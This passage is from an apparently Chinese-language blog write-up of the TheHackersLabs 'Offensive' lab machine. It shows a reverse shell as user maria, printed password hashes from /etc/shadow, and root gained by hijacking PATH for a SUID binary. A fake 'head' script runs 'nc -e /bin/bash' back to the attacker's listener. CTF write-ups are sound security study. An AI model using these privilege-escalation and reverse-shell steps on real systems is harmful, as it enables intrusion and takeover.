+connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.31.34<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.31.66<span class="token punctuation">]</span> <span class="token number">34324</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>maria<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>maria<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>maria<span class="token punctuation">)</span></code></pre>
+<h2 id="getroot"><a href="#getroot" class="headerlink" title="getroot"></a>getroot</h2><pre class="language-bash" data-language="bash"><code class="language-bash">maria@TheHackersLabs-Offensive:~$ <span class="token function">cat</span> backup.txt 
+maria <span class="token variable">$2a</span><span class="token variable">$12</span>$.Owp2kO4GHWQzGrZdbymiOnWgDLm7pfaBNv8MxFL7vxWR/zQtBx92</code></pre>
+<p>尝试爆破maria的密码，结果失败</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">maria@TheHackersLabs-Offensive:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">132</span>
+drwx------ <span class="token number">3</span> maria maria  <span class="token number">4096</span> dic <span class="token number">31</span> 05:35 <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">3</span> root  root   <span class="token number">4096</span> dic <span class="token number">29</span> <span class="token number">15</span>:41 <span class="token punctuation">..</span>
+-rwsr-xr-x <span class="token number">1</span> root  root  <span class="token number">16056</span> dic <span class="token number">26</span> <span class="token number">10</span>:22 app
+-rw-r--r-- <span class="token number">1</span> maria maria    <span class="token number">67</span> dic <span class="token number">26</span> <span class="token number">11</span>:20 backup.txt
+-rw------- <span class="token number">1</span> maria maria    <span class="token number">29</span> dic <span class="token number">29</span> <span class="token number">15</span>:41 .bash_history
+-rw-r--r-- <span class="token number">1</span> maria maria   <span class="token number">220</span> mar <span class="token number">29</span>  <span class="token number">2024</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> maria maria  <span class="token number">3526</span> mar <span class="token number">29</span>  <span class="token number">2024</span> .bashrc
+-rw-r--r-- <span class="token number">1</span> maria maria <span class="token number">55646</span> dic  <span class="token number">9</span>  <span class="token number">2021</span> GyMG.jpg
+-rw-r--r-- <span class="token number">1</span> maria maria  <span class="token number">4629</span> dic <span class="token number">27</span> <span class="token number">10</span>:14 index.php
+-rw------- <span class="token number">1</span> maria maria    <span class="token number">20</span> dic <span class="token number">26</span> <span class="token number">11</span>:59 .lesshst
+drwxr-xr-x <span class="token number">3</span> maria maria  <span class="token number">4096</span> dic <span class="token number">25</span> 06:02 .local
+-rw-r--r-- <span class="token number">1</span> maria maria   <span class="token number">257</span> dic <span class="token number">25</span> <span class="token number">18</span>:46 logout.php
+-rw-r--r-- <span class="token number">1</span> maria maria   <span class="token number">807</span> mar <span class="token number">29</span>  <span class="token number">2024</span> .profile
+-rw-r--r-- <span class="token number">1</span> maria maria    <span class="token number">29</span> dic <span class="token number">31</span> 05:35 user.txt
+-rw-r--r-- <span class="token number">1</span> maria maria  <span class="token number">4721</span> dic <span class="token number">27</span> 07:47 welcome.php</code></pre>
+<p>注意力放在这个app elf上</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">maria@TheHackersLabs-Offensive:~$ ./app
+
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Mostrando las primeras <span class="token number">8</span> líneas del archivo /etc/shadow 
+
+root:<span class="token variable">$y</span><span class="token variable">$j9T</span><span class="token variable">$2mXNTjVfEEjRt6t2uVu7k0</span><span class="token variable">$RBnftcaGot4JsJ8DHVuo0LkG8UuuKR68CdazrjK2Rf8</span>:20088:0:99999:7:::
+daemon:*:20066:0:99999:7:::
+bin:*:20066:0:99999:7:::
+sys:*:20066:0:99999:7:::
+sync:*:20066:0:99999:7:::
+games:*:20066:0:99999:7:::
+man:*:20066:0:99999:7:::
+lp:*:20066:0:99999:7:::
+
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Mostrando las primeras <span class="token number">8</span> líneas del archivo /etc/shadow 
+
+root:<span class="token variable">$y</span><span class="token variable">$j9T</span><span class="token variable">$2mXNTjVfEEjRt6t2uVu7k0</span><span class="token variable">$RBnftcaGot4JsJ8DHVuo0LkG8UuuKR68CdazrjK2Rf8</span>:20088:0:99999:7:::
+daemon:*:20066:0:99999:7:::
+bin:*:20066:0:99999:7:::
+sys:*:20066:0:99999:7:::
+sync:*:20066:0:99999:7:::
+games:*:20066:0:99999:7:::
+man:*:20066:0:99999:7:::
+lp:*:20066:0:99999:7:::</code></pre>
+<p>可以查看shadow文件，反编译一下看看源码<br><img src="https://ooo.0x0.ooo/2025/01/03/OEDaQv.png" alt="OEDaQv.png" loading="lazy"><br>return 的时候没有加绝对地址，所以可以环境变量劫持</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">maria@TheHackersLabs-Offensive:~$ <span class="token function">nano</span> <span class="token function">head</span>
+maria@TheHackersLabs-Offensive:~$ <span class="token function">cat</span> <span class="token function">head</span>
+<span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash <span class="token number">192.168</span>.31.34 <span class="token number">4567</span>
+maria@TheHackersLabs-Offensive:~$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/home/maria:<span class="token environment constant">$PATH</span>
+maria@TheHackersLabs-Offensive:~$ <span class="token function">which</span> <span class="token function">head</span>
+/usr/bin/head
+maria@TheHackersLabs-Offensive:~$ <span class="token function">ls</span>
+app  backup.txt  GyMG.jpg  <span class="token function">head</span>  index.php  logout.php  user.txt  welcome.php
+maria@TheHackersLabs-Offensive:~$ <span class="token function">chmod</span> +x <span class="token function">head</span>
+maria@TheHackersLabs-Offensive:~$ <span class="token function">which</span> <span class="token function">head</span>
+/home/maria/head
+maria@TheHackersLabs-Offensive:~$ ./app
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Mostrando las primeras <span class="token number">8</span> líneas del archivo /etc/shadow 
+
+root:<span class="token variable">$y</span><span class="token variable">$j9T</span><span class="token variable">$2mXNTjVfEEjRt6t2uVu7k0</span><span class="token variable">$RBnftcaGot4JsJ8DHVuo0LkG8UuuKR68CdazrjK2Rf8</span>:20088:0:99999:7:::
+daemon:*:20066:0:99999:7:::
+bin:*:20066:0:99999:7:::
+sys:*:20066:0:99999:7:::
+sync:*:20066:0:99999:7:::
+games:*:20066:0:99999:7:::
+man:*:20066:0:99999:7:::
+lp:*:20066:0:99999:7:::
+
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Mostrando las primeras <span class="token number">8</span> líneas del archivo /etc/shadow</code></pre>
+<p>注意给这head可执行权限</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>                                                 <span class="token punctuation">[</span><span class="token number">13</span>:58:53<span class="token punctuation">]</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.31.34<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.31.66<span class="token punctuation">]</span> <span class="token number">54764</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>maria<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>maria<span class="token punctuation">)</span></code></pre>
+<p>成功拿到root权限。<br>还是挺有意思的靶机，去复习了。</p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/e23e0315/" title="thehackerslabs-Offensive">https://tao0845.github.io/posts/e23e0315/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/66723be2/" rel="next" title="Vulnyx-tunnel"><span class="post-nav-text">Vulnyx-tunnel</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
